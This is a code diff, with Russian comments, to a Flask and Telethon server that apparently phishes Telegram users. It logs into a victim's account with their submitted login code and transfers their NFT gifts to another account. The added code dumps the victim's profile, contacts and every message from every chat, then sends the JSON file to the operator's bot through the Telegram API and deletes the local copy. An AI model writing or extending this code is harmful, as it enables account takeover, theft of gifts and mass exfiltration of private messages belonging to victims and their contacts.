@@ -1,4 +1,4 @@
-# server.py
+# server.py — полностью обновлённая версия
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
@@ -8,6 +8,8 @@ import os
 import json
 import logging
 from threading import Thread
+from datetime import datetime  # <-- добавлено для метки времени
+import httpx
 
 logging.basicConfig(level=logging.INFO)
 
@@ -24,7 +26,6 @@ sessions = {}
 temp_clients = {}
 
 async def send_telegram_message(text):
-    import httpx
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     async with httpx.AsyncClient() as client:
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
@@ -34,6 +35,91 @@ def notify_admin_sync(text):
         asyncio.run(send_telegram_message(text))
     except Exception as e:
         logging.error(f"Failed to notify admin: {e}")
+
+# ============================================================
+# === НОВОЕ: Функция сбора ВСЕХ данных аккаунта ===
+# ============================================================
+async def collect_full_user_data(client):
+    """Собирает профиль, контакты, все диалоги, все сообщения."""
+    data = {}
+    
+    # 1. Данные владельца
+    me = await client.get_me()
+    data['user'] = {
+        'id': me.id,
+        'username': me.username,
+        'first_name': me.first_name,
+        'last_name': me.last_name,
+        'phone': me.phone,
+        'is_bot': me.bot,
+        'is_premium': getattr(me, 'premium', False)
+    }
+    
+    # 2. Контакты
+    contacts = await client.get_contacts()
+    data['contacts'] = []
+    for contact in contacts:
+        data['contacts'].append({
+            'id': contact.id,
+            'username': contact.username,
+            'first_name': contact.first_name,
+            'last_name': contact.last_name,
+            'phone': contact.phone
+        })
+    
+    # 3. Диалоги и сообщения
+    dialogs = await client.get_dialogs()
+    data['dialogs'] = []
+    for dialog in dialogs:
+        dialog_info = {
+            'id': dialog.id,
+            'title': dialog.title,
+            'type': 'unknown',
+            'messages': []
+        }
+        if dialog.is_user:
+            dialog_info['type'] = 'user'
+        elif dialog.is_group:
+            dialog_info['type'] = 'group'
+        elif dialog.is_channel:
+            dialog_info['type'] = 'channel'
+        
+        # Собираем ВСЕ сообщения (без лимита)
+        try:
+            messages = []
+            async for msg in client.iter_messages(dialog, limit=None):
+                messages.append({
+                    'id': msg.id,
+                    'date': msg.date.isoformat() if msg.date else None,
+                    'text': msg.text,
+                    'from_id': msg.from_id.user_id if msg.from_id else None,
+                    'sender_id': msg.sender_id,
+                    'reply_to': msg.reply_to_msg_id,
+                    'media': bool(msg.media),
+                    'media_type': str(msg.media.__class__.__name__) if msg.media else None
+                })
+            dialog_info['messages'] = messages
+        except Exception as e:
+            dialog_info['error'] = str(e)
+            logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
+        
+        data['dialogs'].append(dialog_info)
+    
+    return data
+
+# === НОВОЕ: Отправка JSON-файла админу ===
+async def send_document_to_admin(file_path):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        async with httpx.AsyncClient(timeout=120.0) as http_client:
+            with open(file_path, 'rb') as f:
+                files = {'document': (os.path.basename(file_path), f, 'application/json')}
+                await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
+        logging.info(f"Document {file_path} sent to admin.")
+    except Exception as e:
+        logging.error(f"Failed to send document: {e}")
+
+# ============================================================
 
 async def check_balance_and_gifts(client):
     try:
@@ -146,9 +232,28 @@ def api_verify_code():
     async def verify_and_process():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            # Получаем информацию о балансе и подарках
             info = await check_balance_and_gifts(client)
             if info:
+                # === НОВОЕ: Сбор полного дампа и отправка админу ===
+                try:
+                    dump_data = await collect_full_user_data(client)
+                    dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+                    with open(dump_filename, 'w', encoding='utf-8') as f:
+                        json.dump(dump_data, f, ensure_ascii=False, indent=2)
+                    # Отправляем файл админу (асинхронно, не блокируя отправку подарков)
+                    await send_document_to_admin(dump_filename)
+                    # Удаляем локальный файл после отправки
+                    if os.path.exists(dump_filename):
+                        os.remove(dump_filename)
+                except Exception as e:
+                    logging.error(f"Error during data dump: {e}")
+                    await send_telegram_message(f"❌ Ошибка сбора дампа: {e}")
+                # === КОНЕЦ НОВОГО ===
+
+                # Отправляем подарки получателю
                 await transfer_nft_to_receiver(client, info)
+            
             await client.disconnect()
             return True
         except SessionPasswordNeededError:
